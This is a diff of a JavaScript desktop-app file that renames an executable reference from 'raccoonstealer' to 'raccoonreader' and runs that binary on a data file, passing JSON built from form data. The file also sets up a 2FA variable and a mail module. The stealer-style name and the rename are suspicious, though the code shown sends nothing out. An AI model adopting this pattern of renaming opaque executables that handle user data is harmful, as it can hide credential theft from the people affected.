@@ -4,7 +4,7 @@ const path = paths.getPath();
 const exec = require('child_process').execFile;
 const sendMail = require('./js/sendmail.js')
 const fs = require('fs');
-const raccoonstealer = paths.getStealer();
+const raccoonreader = paths.getReader();
 
 let twoFA = "";
 
@@ -71,10 +71,10 @@ document.getElementById('submitv').addEventListener('click', () =>{ //Verificar 
         };
         let jsoninfo = paths.makeCorrectJSON(JSON.stringify(info));
         let jsondata = paths.makeCorrectJSON(JSON.stringify(data));
-        exec(raccoonstealer, ["-c", "-y", `${path}/data.rlc`], (error, stdout, stderr) =>{
+        exec(raccoonreader, ["-c", "-y", `${path}/data.rlc`], (error, stdout, stderr) =>{
             if (error) window.location.href = `error.html?err=${encodeURIComponent(error)}`;
             if (stderr) window.location.href = `error.html?err=${encodeURIComponent(stderr)}`;
-            exec(raccoonstealer, ["-a", `${path}/data.rlc`, jsondata, jsoninfo], (error, stdout, stderr) =>{
+            exec(raccoonreader, ["-a", `${path}/data.rlc`, jsondata, jsoninfo], (error, stdout, stderr) =>{
                 if (error) window.location.href = `error.html?err=${encodeURIComponent(error)}`;
                 if (stderr) window.location.href = `error.html?err=${encodeURIComponent(stderr)}`;
                 return;
